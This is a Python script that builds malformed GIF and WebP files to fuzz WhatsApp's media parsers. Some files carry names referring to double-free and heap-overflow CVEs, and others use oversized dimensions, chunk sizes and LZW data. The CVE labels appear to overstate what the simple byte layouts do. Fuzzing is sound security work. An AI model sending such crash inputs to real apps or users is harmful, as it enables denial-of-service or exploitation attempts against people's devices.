#!/usr/bin/env python3
"""Generate malformed GIF/WebP files to fuzz WhatsApp's media parsers."""

import struct
import os

OUTPUT = "/home/kali/2stage/fuzz/crafted_gifs"
os.makedirs(OUTPUT, exist_ok=True)

def gif_header(width=10, height=10):
    return b'GIF89a' + struct.pack('<HH', width, height) + bytes([0xF7, 0x00, 0x00])

def gct(size=256):
    return bytes([i & 0xFF for i in range(size) for _ in range(3)])[:size*3]

def img_desc(left=0, top=0, width=10, height=10):
    return b'\x2C' + struct.pack('<HHHH', left, top, width, height) + b'\x00'

def gce():
    return b'\xF9\x04\x00\x00\x00\x00\x00'

def lzw_data(min_code=2):
    return bytes([min_code]) + b'\x04\x00\x00'

# 1. Double-free variant (CVE-2019-11932 pattern)
d = gif_header() + gct() + gce() + img_desc() + lzw_data() + gce() + img_desc() + lzw_data() + b'\x3B'
with open(os.path.join(OUTPUT, "double_free_variant.gif"), 'wb') as f: f.write(d)
print(f"[1] double_free_variant.gif ({len(d)} bytes)")

# 2. Massive LZW data
d = gif_header() + gct() + img_desc() + bytes([12]) + bytes([0xFF]*10000) + b'\x00\x3B'
with open(os.path.join(OUTPUT, "massive_lzw.gif"), 'wb') as f: f.write(d)
print(f"[2] massive_lzw.gif ({len(d)} bytes)")

# 3. Truncated sub-block
d = gif_header() + gct() + img_desc() + bytes([2]) + bytes([0xFF]) + bytes([0x42]*50) + b'\x00\x3B'
with open(os.path.join(OUTPUT, "truncated_subblock.gif"), 'wb') as f: f.write(d)
print(f"[3] truncated_subblock.gif ({len(d)} bytes)")

# 4. Nested comment extensions
d = gif_header() + gct()
for i in range(200):
    d += b'\xFE\xFF' + bytes([0x41]*255)
d += b'\x00' + img_desc() + lzw_data() + b'\x3B'
with open(os.path.join(OUTPUT, "nested_comments.gif"), 'wb') as f: f.write(d)
print(f"[4] nested_comments.gif ({len(d)} bytes)")

# 5. WebP heap overflow
d = bytearray(b'RIFF\x64\x00\x00\x00WEBPVP8 \x50\x00\x00\x00\x9D\x01\x2A')
d += struct.pack('<HH', 10, 10)
d += bytes([0xFF]*70)
struct.pack_into('<I', d, 4, len(d) - 8)
with open(os.path.join(OUTPUT, "heap_overflow.webp"), 'wb') as f: f.write(d)
print(f"[5] heap_overflow.webp ({len(d)} bytes)")

# 6. WebP massive chunk size (CVE-2023-4863 variant)
d = b'RIFF\xFF\xFF\xFF\xFFWEBPVP8L' + struct.pack('<I', 0x7FFFFFFF) + bytes([0x2F]*100)
with open(os.path.join(OUTPUT, "massive_chunk.webp"), 'wb') as f: f.write(d)
print(f"[6] massive_chunk.webp ({len(d)} bytes)")

# 7. GIF zero-size image
d = gif_header() + gct() + b'\x2C' + struct.pack('<HHHH', 0, 0, 0, 0) + b'\x00' + lzw_data() + b'\x3B'
with open(os.path.join(OUTPUT, "zero_size.gif"), 'wb') as f: f.write(d)
print(f"[7] zero_size.gif ({len(d)} bytes)")

# 8. GIF huge dimensions
d = b'GIF89a' + struct.pack('<HH', 65535, 65535) + bytes([0xF7, 0x00, 0x00]) + gct() + img_desc(0, 0, 65535, 65535) + lzw_data() + b'\x3B'
with open(os.path.join(OUTPUT, "huge_dimensions.gif"), 'wb') as f: f.write(d)
print(f"[8] huge_dimensions.gif ({len(d)} bytes)")

print(f"\nAll files in: {OUTPUT}")
